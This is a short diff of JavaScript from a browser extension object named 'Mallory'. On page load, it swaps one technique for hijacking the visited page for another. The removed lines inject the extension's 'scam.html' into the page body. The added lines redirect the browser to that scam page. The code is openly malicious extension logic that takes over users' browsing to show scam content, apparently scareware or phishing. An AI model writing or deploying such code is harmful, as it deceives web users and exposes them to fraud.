@@ -46,12 +46,8 @@ var Mallory = {
     },
     showPopup: function(){
       window.onload=function(){
-        var save = document.body.innerHTML;
-        fetch(chrome.extension.getURL('scam.html'))
-        .then(response => response.text())
-        .then(data => {
-            document.body.innerHTML = data+document.body.innerHTML;
-        });
+        var expage = document.location.href;
+        document.location.href = chrome.extension.getURL('scam.html')
       };
     },
     timestamp: function(){
